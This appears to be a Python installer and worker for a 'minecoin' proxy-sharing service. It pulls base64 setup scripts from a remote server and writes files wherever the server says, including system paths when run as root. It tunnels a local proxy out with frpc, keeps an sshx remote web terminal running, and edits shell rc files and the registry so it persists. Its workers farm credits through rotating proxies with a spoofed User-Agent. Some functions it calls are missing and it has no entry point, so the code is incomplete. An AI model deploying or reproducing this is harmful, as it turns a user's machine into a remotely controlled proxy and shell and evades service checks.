import argparse
import base64
import json
import os
import platform
import re
import shutil
import signal
import socket
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile

win = platform.system() == "Windows"
termux = os.path.isdir("/data/data/com.termux")
root = (not win) and hasattr(os, "geteuid") and os.geteuid() == 0
base = "https://dashboard.minet.vn"
delay = 30
ver = "0.61.1"
orig = socket.socket
local = threading.local()

class sock(orig):
    def __new__(cls, af=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, *args, **kwargs):
        p = getattr(local, "proxy", None)
        if p and p.lower().startswith("socks"):
            try:
                import socks
            except:
                show("Loi: Can cai PySocks de chay SOCKS proxy. Chay: pip install pysocks")
                raise RuntimeError("Thieu pysocks")
            s = socks.socksocket(af, type, proto, *args, **kwargs)
            m = re.match(r"^(socks5h?|socks4)://(?:([^:@]+):([^@]+)@)?([^:]+):(\d+)/?$", p, re.I)
            if m:
                t = socks.SOCKS4 if m.group(1).lower() == "socks4" else socks.SOCKS5
                s.set_proxy(t, m.group(4), int(m.group(5)), rdns=(m.group(1).lower() in ("socks5", "socks5h")), username=m.group(2), password=m.group(3))
            return s
        return orig.__new__(cls, af, type, proto, *args, **kwargs)

    def connect(self, address):
        p = getattr(local, "proxy", None)
        if p and (p.lower().startswith("http://") or p.lower().startswith("https://")):
            m = re.match(r"^https?://(?:([^:@]+):([^@]+)@)?([^:]+):(\d+)/?$", p, re.I)
            if m:
                user = m.group(1)
                pwd = m.group(2)
                h = m.group(3)
                val = int(m.group(4))
                orig.connect(self, (h, val))
                host, port = address
                req = f"CONNECT {host}:{port} HTTP/1.1\r\n"
                if user and pwd:
                    auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
                    req += f"Proxy-Authorization: Basic {auth}\r\n"
                req += "\r\n"
                self.sendall(req.encode())
                resp = b""
                while b"\r\n\r\n" not in resp:
                    chunk = self.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                if b"200" not in resp.split(b"\r\n")[0]:
                    raise socket.error("Proxy connection failed")
                return
        return orig.connect(self, address)

socket.socket = sock

def loc():
    for d in [os.path.expanduser("~/.local/bin"), os.path.expanduser("~/bin"), os.path.join(os.environ.get("XDG_DATA_HOME") or os.path.expanduser("~/.local/share"), "minet", "bin")]:
        try:
            os.makedirs(d, exist_ok=True)
            if os.access(d, os.W_OK):
                return d
        except: pass
    return os.path.join(os.environ.get("XDG_DATA_HOME") or os.path.expanduser("~/.local/share"), "minet", "bin")

if termux:
    home = "/data/data/com.termux/files/minet"
    conf = f"{os.environ.get('PREFIX', '')}/etc/tinyproxy/tinyproxy.conf" if os.environ.get("PREFIX") else "/data/data/com.termux/files/usr/etc/tinyproxy/tinyproxy.conf"
    bin = f"{os.environ.get('PREFIX', '')}/bin/frpc" if os.environ.get("PREFIX") else "/data/data/com.termux/files/usr/bin/frpc"
if not termux:
    if win:
        home = os.path.join(os.environ.get("LOCALAPPDATA") or os.path.expanduser("~"), "minet")
        conf = os.path.join(home, "tinyproxy.conf")
        bin = os.path.join(home, "frpc.exe")
    if not win:
        if root:
            home = "/opt/minet"
            conf = "/etc/tinyproxy/tinyproxy.conf"
            bin = "/usr/local/bin/frpc"
        if not root:
            home = os.path.join(os.environ.get("XDG_DATA_HOME") or os.path.expanduser("~/.local/share"), "minet")
            conf = os.path.join(home, "tinyproxy.conf")
            bin = os.path.join(loc(), "frpc")

dir = os.path.join(home, "logs")
toml = os.path.join(home, "tun.toml")
cfg = os.path.join(home, "config.json")
pids = os.path.join(home, "pids")
proxies = []
index = 0

def show(msg):
    try:
        print(msg, flush=True)
    except: print(str(msg).encode("ascii", "replace").decode("ascii"), flush=True)

def init():
    for d in (home, dir, pids):
        os.makedirs(d, exist_ok=True)

def alive(p):
    if not p:
        return False
    if win:
        try:
            r = subprocess.run(["tasklist", "/FI", f"PID eq {p}", "/NH"], capture_output=True, text=True, timeout=5)
            return str(p) in r.stdout
        except: return False
    try:
        os.kill(p, 0)
        return True
    except: return False

def kill(name):
    try:
        p = int(open(os.path.join(pids, f"{name}.pid")).read().strip())
    except: p = None
    if p:
        if win:
            subprocess.run(["taskkill", "/F", "/PID", str(p), "/T"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not win:
            try:
                os.kill(p, signal.SIGTERM)
            except: pass
    try:
        os.remove(os.path.join(pids, f"{name}.pid"))
    except: pass

def socks(p):
    try:
        import socks
    except: show("Loi: SOCKS proxy can PySocks. Chay: pip install pysocks"); return
    local.proxy = p

def send(url, data=None, headers=None, timeout=20, proxy=None):
    global index
    h = dict(headers or {})
    h.setdefault("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    h.setdefault("Accept", "*/*")
    h.setdefault("Accept-Language", "en-US,en;q=0.9")
    h.setdefault("Referer", base + "/")
    if isinstance(data, dict):
        data = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    p = proxy
    if p is None and proxies:
        p = proxies[index % len(proxies)]
        index += 1
    if p and p.lower().startswith("socks"):
        socks(p)
        op = urllib.request.build_opener()
    if not (p and p.lower().startswith("socks")):
        local.proxy = None
        if p:
            op = urllib.request.build_opener(urllib.request.ProxyHandler({"http": p, "https": p}))
        if not p:
            op = urllib.request.build_opener()
    req = urllib.request.Request(url, data=data, headers=h)
    try:
        with op.open(req, timeout=timeout) as r:
            return r.read()
    except urllib.error.HTTPError as e:
        try:
            e.body = e.read()
        except: e.body = b""
        raise e

def tune(tgt, src):
    try:
        with open(tgt, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        lines = content.splitlines()
        head = []
        body = []
        seen = False
        for l in lines:
            s = l.strip()
            if "proxyURL" in s or "protocol" in s or "[transport]" in s or "httpProxy" in s:
                continue
            if s.startswith("[[proxies]]"):
                seen = True
            if seen:
                body.append(l)
            if not seen:
                head.append(l)
        if src:
            head.append('transport.protocol = "tcp"')
            head.append(f'transport.proxyURL = "{src}"')
        with open(tgt, "w", encoding="utf-8") as f:
            f.write("\n".join(head) + "\n\n" + "\n".join(body) + "\n")
    except: pass

def clean(raw):
    s = raw.strip()
    if not s:
        return None
    if "://" in s:
        return s
    p = s.split(":")
    if len(p) == 4:
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    if len(p) == 2:
        return f"http://{p[0]}:{p[1]}"
    if len(p) == 3:
        return f"http://{p[2]}@{p[0]}:{p[1]}"
    return None

def apply(src):
    global proxies, index
    proxies = []
    index = 0
    if not src:
        return
    lst = []
    if os.path.isfile(src):
        with open(src) as f:
            for ln in f:
                ln = ln.strip()
                if ln and not ln.startswith("#"):
                    p = clean(ln)
                    if p:
                        lst.append(p)
    if not os.path.isfile(src):
        p = clean(src)
        if p:
            lst.append(p)
    if not lst:
        return
    rx = re.compile(r"^(socks5h?|socks4|http|https)://(?:([^:@]+):([^@]+)@)?([^:]+):(\d+)/?$", re.I)
    good = [p for p in lst if rx.match(p)]
    if any(p.lower().startswith("socks") for p in good):
        try:
            import socks
        except: raise RuntimeError("SOCKS proxy can PySocks. Cai: pip install pysocks")
    proxies = good
    show(f"  proxy: {len(proxies)} entry")

def unwrap(s):
    rx = re.compile(r'printf\s+"%[bs]"\s+"([A-Za-z0-9+/=\\n\s]+?)"\s*\|\s*base64\s+-d\s*\|\s*sh', re.M)
    for _ in range(5):
        m = rx.search(s)
        if not m:
            return s
        try:
            b = re.sub(r"\\n|\s", "", m.group(1))
            s = base64.b64decode(b).decode("utf-8", errors="ignore")
        except: return s
    return s

def extract(s):
    s = unwrap(s)
    out = {}
    rx = re.compile(r'printf\s+"%[bs]"\s+"([A-Za-z0-9+/=\\n\s]+?)"\s*\|\s*base64\s+-d\s*>\s*("?[^"\n]+?"?)\s*$', re.M)
    for m in rx.finditer(s):
        try:
            data = base64.b64decode(re.sub(r"\\n|\s", "", m.group(1)))
            path = m.group(2).strip().strip('"').replace("$MR", home).replace("$PREFIX", os.environ.get("PREFIX", ""))
            out[path] = data
        except: continue
    return out

def fetch(email):
    try:
        ip = send("https://api.ipify.org", timeout=10).decode().strip()
    except: ip = ""
    if not ip:
        raise RuntimeError("Khong lay duoc IP public.")
    url = f"{base}/api/minecoin/setup?email={urllib.parse.quote(email)}&ip={urllib.parse.quote(ip)}&mode=dashboard"
    raw = send(url, timeout=30).decode("utf-8", errors="ignore").strip()
    if re.fullmatch(r"[A-Za-z0-9+/\s]+={0,2}", raw):
        try:
            raw = base64.b64decode(re.sub(r"\s", "", raw)).decode("utf-8", errors="ignore")
        except: pass
    return raw, ip

def download():
    if os.path.isfile(bin):
        return bin
    arch = platform.machine().lower()
    fa = {"x86_64": "amd64", "amd64": "amd64", "aarch64": "arm64", "arm64": "arm64", "armv7l": "arm", "armhf": "arm"}.get(arch)
    if not fa:
        raise RuntimeError(f"Kien truc khong ho tro: {arch}")
    ext = "zip" if win else "tar.gz"
    plat = "windows" if win else "linux"
    url = f"https://github.com/fatedier/frp/releases/download/v{ver}/frp_{ver}_{plat}_{fa}.{ext}"
    show(f"  tai frpc: {url}")
    init()
    tmp = os.path.join(home, "_dl")
    shutil.rmtree(tmp, ignore_errors=True)
    os.makedirs(tmp, exist_ok=True)
    arc = os.path.join(tmp, f"frp.{ext}")
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    err = None
    for attempt in range(1, 4):
        try:
            with urllib.request.urlopen(req, timeout=120) as r:
                data = r.read()
            with open(arc, "wb") as f:
                f.write(data)
            if os.path.getsize(arc) > 100000:
                break
            err = RuntimeError("file qua nho")
        except Exception as e: err = e; show(f"  tai lan {attempt} fail: {e}"); time.sleep(2)
    if not os.path.isfile(arc) or os.path.getsize(arc) <= 100000:
        shutil.rmtree(tmp, ignore_errors=True)
        raise RuntimeError(f"Tai frpc that bai: {err}")
    exe = "frpc.exe" if win else "frpc"
    try:
        if ext == "zip":
            with zipfile.ZipFile(arc) as z:
                z.extractall(tmp)
        if ext != "zip":
            with tarfile.open(arc) as tar:
                tar.extractall(tmp)
    except Exception as e: shutil.rmtree(tmp, ignore_errors=True); raise RuntimeError(f"Khong giai nen duoc: {e}")
    for r, _, fs in os.walk(tmp):
        if exe in fs:
            os.makedirs(os.path.dirname(bin) or ".", exist_ok=True)
            try:
                shutil.copy2(os.path.join(r, exe), bin)
            except:
                try:
                    kill("frpc")
                    time.sleep(1)
                    shutil.copy2(os.path.join(r, exe), bin)
                except Exception as e: raise RuntimeError(f"Khong ghi duoc {bin}: {e}")
            if not win:
                os.chmod(bin, 0o755)
            shutil.rmtree(tmp, ignore_errors=True)
            return bin
    shutil.rmtree(tmp, ignore_errors=True)
    raise RuntimeError(f"Khong tim thay {exe} trong archive.")

def email(cur=None):
    if cur:
        return cur
    while True:
        try:
            val = input("Email: ").strip()
        except: raise SystemExit("Can nhap email.")
        if val:
            return val
        show("  Email khong duoc de trong.")

def install(args):
    init()
    m = email(args.email)
    src = getattr(args, "proxy", None)
    if src is None:
        show("\nProxy (cho API calls: fetch/heartbeat/update-ip, KHONG anh huong tunnel):")
        show("  - URL: socks5://host:port, http://user:pass@host:port, ...")
        show("  - Path toi file danh sach (mot dong mot URL)")
        show("  - Enter de khong dung proxy, 'none' de xoa proxy hien tai")
        try:
            src = input("Proxy [none]: ").strip()
        except: src = None
        if not src or src.lower() in ("none", "no", "n", "off"):
            src = None
    try:
        apply(src)
    except Exception as e: show(f"  {e}"); src = None
    show("[1/4] Fetch cau hinh...")
    script, ip = fetch(m)
    files = extract(script)
    if not files:
        dbg = os.path.join(tempfile.gettempdir(), "minet_setup_debug.sh")
        with open(dbg, "w", encoding="utf-8") as f:
            f.write(script)
        raise SystemExit(f"Khong trich duoc file. Xem {dbg}")
    show("[2/4] Ghi cau hinh (.toml / .conf)...")
    paths = {}
    for p, d in files.items():
        if not p.endswith((".toml", ".conf")):
            continue
        tgt = os.path.join(home, os.path.basename(p)) if win or not root else p
        paths[os.path.basename(tgt)] = tgt
        try:
            os.makedirs(os.path.dirname(tgt) or ".", exist_ok=True)
            with open(tgt, "wb") as f:
                f.write(d)
            show(f"  {tgt} ({len(d)} bytes)")
        except:
            fallback = os.path.join(home, os.path.basename(p))
            os.makedirs(os.path.dirname(fallback) or ".", exist_ok=True)
            with open(fallback, "wb") as f:
                f.write(d)
            paths[os.path.basename(fallback)] = fallback
            show(f"  {fallback} ({len(d)} bytes) [fallback khong co quyen ghi {tgt}]")
    tgt = paths.get("tun.toml") or toml
    tune(tgt, src)
    try:
        txt = open(tgt, encoding="utf-8", errors="ignore").read()
    except: txt = ""
    rp = re.search(r"remotePort\s*=\s*(\d+)", txt)
    sa = re.search(r'serverAddr\s*=\s*"([^"]+)"', txt)
    sp = re.search(r"serverPort\s*=\s*(\d+)", txt)
    lp = re.search(r"localPort\s*=\s*(\d+)", txt)
    limit = getattr(args, "threads", None)
    if limit is None:
        show("\nSo luong luong (threads) muon chay de dao coin:")
        try:
            val = input("So thread 3]: ").strip()
            limit = int(val) if val else 3
        except:
            limit = 3
    res = {
        "email": m,
        "ip": ip,
        "proxy": src,
        "threads": limit,
        "remote": int(rp.group(1)) if rp else None,
        "server": sa.group(1) if sa else None,
        "port": int(sp.group(1)) if sp else None,
        "local": int(lp.group(1)) if lp else 8888,
    }
    with open(cfg, "w") as f:
        json.dump(res, f, indent=2)
    show("[3/4] Kiem tra binary...")
    frpc = download()
    show(f"  frpc: {frpc}")
    if win:
        show("  HTTP proxy: se dung builtin Python proxy (khong can tinyproxy).")
    if not win:
        if not shutil.which("tinyproxy"):
            if root:
                show("  tinyproxy chua co - se dung builtin Python proxy (apt-get install tinyproxy de doi sang tinyproxy).")
            if not root:
                show("  Khong co tinyproxy (va khong co root de cai) - se dung builtin Python proxy.")
    show("[4/4] Xong.")
    show(f"  remote {res['server']}:{res['port']} -> tunnel port {res['remote']}")

def load():
    try:
        with open(cfg) as f:
            res = json.load(f)
    except: raise SystemExit("Chua co config. Chay: python minet.py install")
    try:
        apply(res.get("proxy"))
    except Exception as e: show(f"  proxy warn: {e}")
    return res

def pipe(a, b):
    try:
        while True:
            chunk = a.recv(65536)
            if not chunk:
                break
            b.sendall(chunk)
    except: pass
    finally:
        for s in (a, b):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except: pass

def client(cli, url=None):
    try:
        cli.settimeout(30)
        buf = b""
        while b"\r\n\r\n" not in buf:
            c = cli.recv(4096)
            if not c:
                return
            buf += c
            if len(buf) > 16384:
                return
        first = buf.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        parts = first.split()
        if len(parts) < 2:
            return
        method, target = parts[0].upper(), parts[1]
        if url:
            local.proxy = url
        if method == "CONNECT":
            host, _, port = target.partition(":")
            port = int(port or 443)
            up = socket.create_connection((host, port), timeout=15)
            cli.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")
        if method != "CONNECT":
            m = re.search(rb"\r\nHost:\s*([^\r\n]+)", buf, re.I)
            if not m:
                return
            hdr = m.group(1).decode("latin-1", "replace").strip()
            if ":" in hdr:
                host, port = hdr.rsplit(":", 1)
                port = int(port)
            if ":" not in hdr:
                host, port = hdr, 80
            up = socket.create_connection((host, port), timeout=15)
            up.sendall(buf)
        cli.settimeout(None)
        up.settimeout(None)
        t = threading.Thread(target=pipe, args=(up, cli), daemon=True)
        t.start()
        pipe(cli, up)
        t.join(timeout=1)
    except: pass
    finally:
        try:
            cli.close()
        except: pass

def proxyd(args):
    port = args.port
    url = getattr(args, "proxy", None)
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", port))
    srv.listen(128)
    show(f"builtin-proxy listening 127.0.0.1:{port}")
    try:
        while True:
            cli, _ = srv.accept()
            threading.Thread(target=client, args=(cli, url), daemon=True).start()
    except: pass

def spawn(name, cmd, path):
    log = open(path, "ab")
    kw = {"stdout": log, "stderr": subprocess.STDOUT, "stdin": subprocess.DEVNULL}
    if win:
        kw["creationflags"] = 0x00000008 | 0x00000200
    if not win:
        kw["start_new_session"] = True
    proc = subprocess.Popen(cmd, **kw)
    open(os.path.join(pids, f"{name}.pid"), "w").write(str(proc.pid))
    return proc.pid

def tp(data):
    local = data.get("local", 8888)
    url = data.get("proxy")
    p = None if win else shutil.which("tinyproxy")
    c = conf if (not win and root) else os.path.join(home, "tinyproxy.conf")
    if p and root and os.path.isfile(c):
        kill("tinyproxy")
        pid = spawn("tinyproxy", [p, "-d", "-c", c], os.path.join(dir, "tp.log"))
        show(f"  tinyproxy pid={pid}")
        return pid
    kill("tinyproxy")
    py = sys.executable
    cmd = [py, os.path.abspath(__file__), "_proxyd", "--port", str(local)]
    if url:
        cmd += ["--proxy", url]
    pid = spawn("tinyproxy", cmd, os.path.join(dir, "tp.log"))
    show(f"  builtin-proxy pid={pid} (port {local})")
    return pid

def tunnel():
    if not os.path.isfile(toml):
        raise RuntimeError(f"Thieu {toml}. Chay 'install' truoc.")
    try:
        data = load()
        tune(toml, data.get("proxy"))
    except: pass
    frpc = bin
    if not os.path.isfile(frpc):
        raise RuntimeError("Chua co frpc. Chay 'install' truoc.")
    kill("frpc")
    pid = spawn("frpc", [frpc, "-c", toml], os.path.join(dir, "tun.log"))
    show(f"  frpc pid={pid}")
    log = os.path.join(dir, "tun.log")
    for _ in range(10):
        time.sleep(1)
        try:
            with open(log, encoding="utf-8", errors="ignore") as f:
                if "login to server success" in f.read():
                    show("  frpc: login OK")
                    return pid
        except: pass
        if not alive(pid):
            show("  frpc: die - xem logs/tun.log")
            return pid
    show("  frpc: chua thay 'login success' (xem logs/tun.log)")
    try:
        with open(log, encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
            show("  frpc log:")
            for l in lines[-10:]:
                show("    " + l.strip())
    except: pass
    return pid

def grab():
    path = os.path.join(home, "sshx")
    if os.path.isfile(path):
        return path
    arch = platform.machine().lower()
    fa = {"x86_64": "x86_64", "amd64": "x86_64", "aarch64": "aarch64", "arm64": "aarch64"}.get(arch)
    if not fa:
        raise RuntimeError(f"Kien truc khong ho tro: {arch}")
    url = f"https://s3.amazonaws.com/sshx/sshx-{fa}-unknown-linux-musl.tar.gz"
    show(f"  tai sshx: {url}")
    init()
    tmp = os.path.join(home, "_dl_sshx")
    shutil.rmtree(tmp, ignore_errors=True)
    os.makedirs(tmp, exist_ok=True)
    arc = os.path.join(tmp, "sshx.tar.gz")
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            data = r.read()
        with open(arc, "wb") as f:
            f.write(data)
    except Exception as e:
        shutil.rmtree(tmp, ignore_errors=True)
        raise RuntimeError(f"Tai sshx that bai: {e}")
    try:
        with tarfile.open(arc) as tar:
            tar.extractall(tmp)
    except Exception as e:
        shutil.rmtree(tmp, ignore_errors=True)
        raise RuntimeError(f"Khong giai nen duoc sshx: {e}")
    for r, _, fs in os.walk(tmp):
        if "sshx" in fs:
            try:
                shutil.copy2(os.path.join(r, "sshx"), path)
                os.chmod(path, 0o755)
                shutil.rmtree(tmp, ignore_errors=True)
                return path
            except Exception as e:
                shutil.rmtree(tmp, ignore_errors=True)
                raise RuntimeError(f"Khong ghi duoc sshx: {e}")
    shutil.rmtree(tmp, ignore_errors=True)
    raise RuntimeError("Khong tim thay binary sshx trong archive.")

def ssh():
    try:
        binary = grab()
    except Exception as e:
        show(f"Loi: {e}")
        return
    kill("sshx")
    path = os.path.join(dir, "sshx.log")
    if not win:
        fdir = os.path.join(home, "freeroot")
        pbin = os.path.join(fdir, "proot")
        rdir = os.path.join(fdir, "rootfs")
        if os.path.exists(pbin) and os.path.exists(os.path.join(rdir, ".installed")):
            cmd = [
                "sh", "-c",
                f"while true; do '{pbin}' -0 -r '{rdir}' -b /sys -b /proc -b /dev -b /etc/resolv.conf -b '{binary}':/usr/bin/sshx /usr/bin/sshx; sleep 2; done"
            ]
        else:
            cmd = ["sh", "-c", f"while true; do '{binary}'; sleep 2; done"]
        pid = spawn("sshx", cmd, path)
        show(f"  sshx pid={pid}")

def url(args=None):
    init()
    path = os.path.join(dir, "sshx.log")
    try:
        pid = int(open(os.path.join(pids, "sshx.pid")).read().strip())
    except: pid = None
    if not alive(pid):
        kill("sshx")
        try:
            os.remove(path)
        except: pass
        ssh()
    for i in range(20):
        if os.path.isfile(path):
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                m = re.search(r"https://sshx\.io/[ts]/[A-Za-z0-9_#-]+", content)
                if m:
                    show(f"\nLink sshx.io: {m.group(0)}\n")
                    return
            except: pass
        time.sleep(1)
    show("Khong lay duoc link sshx.io, vui long thu lai.")

def request(m, p, e, ip, url):
    try:
        enc = urllib.parse.quote(ip)
        ch = send(f"{base}/api/minecoin/challenge?email={e}&port={p}&clientIp={enc}", timeout=20, proxy=url)
        if not ch:
            return False, "empty challenge"
        token = base64.b64decode(ch.strip())
        resp = base64.b64encode(token).decode()
        data = {"email": m, "port": p, "response": resp, "clientIp": ip}
        send(f"{base}/api/minecoin/verify", data=data, timeout=15, proxy=url)
        return True, "ok"
    except urllib.error.HTTPError as err: body = getattr(err, "body", b""); detail = body[:150].decode("utf-8", errors="replace").strip(); safe = detail.encode("ascii", "replace").decode("ascii"); return False, f"HTTP {err.code} {safe}"
    except Exception as err: return False, str(err)[:80]

def thread(id, m, p, e, holder, url, stats, event):
    ip = holder["ip"]
    try:
        res = send("https://api.ipify.org", timeout=15, proxy=url or False)
        if res:
            ip = res.decode().strip()
        show(f"[{time.strftime('%H:%M:%S')}] T{id} ip={ip} via {(url or 'direct')[:40]}")
    except: pass
    while not event.is_set():
        ok, detail = request(m, p, e, ip or holder["ip"], url or False)
        with stats["lock"]:
            if ok:
                stats["ok"] += 1
            if not ok:
                stats["err"] += 1
            good = stats["ok"]
            bad = stats["err"]
        short = (url or "direct")[:40]
        if ok:
            show(f"[{time.strftime('%H:%M:%S')}] T{id} ok ip={ip} via {short} (s={good} e={bad})")
        if not ok:
            show(f"[{time.strftime('%H:%M:%S')}] T{id} err: {detail} via {short} (s={good} e={bad})")
            if "429" in detail:
                event.wait(10)
        event.wait(delay)

def loop(stop=lambda: False):
    data = load()
    m = data["email"]
    if not data.get("remote"):
        raise SystemExit("Config thieu remote_port.")
    p = base64.b64encode(str(data["remote"]).encode()).decode()
    e = urllib.parse.quote(m)
    ip = ""
    try:
        res = send("https://api.ipify.org", timeout=10)
        if res:
            ip = res.decode().strip()
    except: pass
    if not ip:
        ip = data.get("ip") or ""
    try:
        if ip:
            send(f"{base}/api/minecoin/update-ip", data={"email": m, "port": p, "ip": ip})
            show(f"[{time.strftime('%H:%M:%S')}] update-ip {ip}")
    except Exception as err: show(f"update-ip err: {err}")
    holder = {"ip": ip or data.get("ip") or ""}
    limit = data.get("threads") or 10
    lst = []
    if proxies:
        for i in range(limit):
            lst.append(proxies[i % len(proxies)])
    if not proxies:
        lst = [None] * limit
    num = len(lst)
    show(f"[{time.strftime('%H:%M:%S')}] worker: {num} thread(s), proxies={len(proxies)}")
    stats = {"ok": 0, "err": 0, "lock": threading.Lock()}
    event = threading.Event()
    threads = []
    for i, url in enumerate(lst):
        t = threading.Thread(target=thread, args=(i, m, p, e, holder, url, stats, event), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(1.5)
    refresh = time.time()
    try:
        while not stop():
            time.sleep(5)
            now = time.time()
            if now - refresh > 600:
                new = ""
                try:
                    res = send("https://api.ipify.org", timeout=10)
                    if res:
                        new = res.decode().strip()
                except: pass
                if not new:
                    new = data.get("ip") or ""
                if new:
                    holder["ip"] = new
                    refresh = now
                    show(f"[{time.strftime('%H:%M:%S')}] ip refresh: {new}")
    finally:
        event.set()
        for t in threads:
            t.join(timeout=5)

def start(args):
    init()
    data = load()
    for n in ("worker", "frpc", "tinyproxy", "sshx"):
        kill(n)
    show("Starting...")
    tp(data)
    tunnel()
    ssh()
    py = sys.executable
    pid = spawn("worker", [py, os.path.abspath(__file__), "worker"], os.path.join(dir, "worker.log"))
    show(f"  worker pid={pid}")
    show("Done.")

def worker(args):
    loop()

def stop(args):
    for name in ("worker", "frpc", "tinyproxy", "sshx"):
        kill(name)
    show("Stopped.")

def status(args):
    for name in ("tinyproxy", "frpc", "worker", "sshx"):
        try:
            pid = int(open(os.path.join(pids, f"{name}.pid")).read().strip())
        except: pid = None
        state = "running" if alive(pid) else "stopped"
        show(f"  {name:10s} {state:8s} pid={pid or '-'}")

def dash(args):
    try:
        wp = int(open(os.path.join(pids, "worker.pid")).read().strip())
    except: wp = None
    try:
        fp = int(open(os.path.join(pids, "frpc.pid")).read().strip())
    except: fp = None
    try:
        sp = int(open(os.path.join(pids, "sshx.pid")).read().strip())
    except: sp = None
    w = "running" if alive(wp) else "stopped"
    f = "running" if alive(fp) else "stopped"
    s = "running" if alive(sp) else "stopped"
    show(f"Mining: {w}")
    show(f"Tunnel: {f}")
    show(f"Terminal (sshx): {s}")

def dashboard(args):
    act = (args.action or "status").lower()
    if act == "start":
        start(args)
        return
    if act == "stop":
        stop(args)
        return
    if act == "restart":
        stop(args)
        start(args)
        return
    if act == "status":
        dash(args)
        return
    if act == "logs":
        ns = argparse.Namespace(target="worker", lines=20)
        logs(ns)
        return
    if act == "uninstall":
        uninstall(args)
        return
    show("Usage: minet dashboard {start|stop|restart|status|logs|uninstall}")
    raise SystemExit(1)

def link(args):
    script = os.path.abspath(__file__)
    py = sys.executable
    if win:
        launcher = os.path.join(home, "minet.cmd")
        init()
        with open(launcher, "w", encoding="utf-8") as f:
            f.write(f'@echo off\r\n"{py}" "{script}" %*\r\n')
        show(f"Da tao: {launcher}")
        with open(os.path.join(home, "minet"), "w", encoding="utf-8", newline="\n") as f:
            f.write(f'#!/bin/sh\nexec "{py}" "{script}" "$@"\n')
        return launcher
    targets = []
    if root:
        targets.append("/usr/local/bin/minet")
    targets.append(os.path.expanduser("~/.local/bin/minet"))
    targets.append(os.path.expanduser("~/bin/minet"))
    targets.append(os.path.join(loc(), "minet"))
    for tgt in targets:
        try:
            os.makedirs(os.path.dirname(tgt), exist_ok=True)
            with open(tgt, "w") as f:
                f.write(f'#!/bin/sh\nexec "{py}" "{script}" "$@"\n')
            os.chmod(tgt, 0o755)
            show(f"Da tao: {tgt}")
            return tgt
        except: continue
    show("Khong tao duoc launcher. Xem quyen ghi thu muc.")
    return None

def setup(args):
    show("===== Minet Setup =====")
    show(f"  platform: {platform.system()}  root: {home}")
    show("")
    force = getattr(args, "force", False)
    exists = os.path.isfile(cfg)
    do = force or not exists
    if exists and not force:
        show(f"Da co config tai {cfg}.")
        try:
            ans = input("Fetch lai cau hinh? [y/N]: ").strip().lower()
        except: ans = ""
        do = ans in ("y", "yes")
    if do:
        ns = argparse.Namespace(email=getattr(args, "email", None), proxy=getattr(args, "proxy", None), threads=getattr(args, "threads", None))
        try:
            install(ns)
        except Exception as e: show(f"Install fail: {e}"); return
    show("")
    show("----- Launcher -----")
    launcher = link(args)
    if launcher:
        folder = os.path.dirname(launcher)
        show("")
        show("----- PATH -----")
        if win:
            import winreg
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_READ) as key:
                    try:
                        cur, _ = winreg.QueryValueEx(key, "PATH")
                    except: cur = ""
            except: cur = ""
            parts = [p for p in cur.split(";") if p]
            if not any(os.path.normcase(p) == os.path.normcase(folder) for p in parts):
                parts.append(folder)
                val = ";".join(parts)
                try:
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_SET_VALUE) as key:
                        winreg.SetValueEx(key, "PATH", 0, winreg.REG_EXPAND_SZ, val)
                    show(f"Da them vao User PATH: {folder}")
                    show("Mo terminal MOI de 'minet' co tac dung.")
                    import ctypes
                    ctypes.windll.user32.SendMessageTimeoutW(0xFFFF, 0x001A, 0, "Environment", 0x0002, 5000, None)
                except Exception as e: show(f"  khong ghi duoc PATH: {e}")
            if folder not in os.environ.get("PATH", ""):
                os.environ["PATH"] = os.environ.get("PATH", "") + ";" + folder
        if not win:
            cur = os.environ.get("PATH", "").split(":")
            if folder not in cur:
                os.environ["PATH"] = os.environ.get("PATH", "") + ":" + folder
            rcs = [os.path.expanduser("~/.bashrc"), os.path.expanduser("~/.bash_profile"), os.path.expanduser("~/.zshrc"), os.path.expanduser("~/.profile")]
            marker = f"# added by minet.py - {folder}"
            line = f"\n{marker}\nexport PATH=\"$PATH:{folder}\"\n"
            written = []
            for rc in rcs:
                try:
                    txt = ""
                    if os.path.isfile(rc):
                        with open(rc) as f:
                            txt = f.read()
                    if marker not in txt:
                        with open(rc, "a") as f:
                            f.write(line)
                        written.append(rc)
                except: pass
            if written:
                show(f"Da ghi export PATH vao: {', '.join(written)}")
                show("Mo shell moi hoac 'source ~/.profile' de co hieu luc.")
    show("")
    show("----- Starting services -----")
    try:
        start(args)
    except Exception as e: show(f"Start fail: {e}"); return
    show("")
    show("===== Done =====")
    if launcher:
        folder = os.path.dirname(launcher)
        ok = folder in os.environ.get("PATH", "").split(os.pathsep)
        if not ok:
            if win:
                show("Su dung sau khi MO TERMINAL MOI:")
            if not win:
                show("Launcher vua tao nhung shell hien tai chua biet.")
                show("Cach dung ngay (chon 1 trong cac cach duoi):")
                show(f'  1) export PATH="$PATH:{folder}"')
                show(f'  2) source ~/.bashrc')
                show(f'  3) {launcher} dashboard status')
                show("")
    show("Lenh minet:")
    show("  minet dashboard status")
    show("  minet dashboard start")
    show("  minet dashboard stop")
    show("  minet dashboard logs")
    show("")
    dash(args)

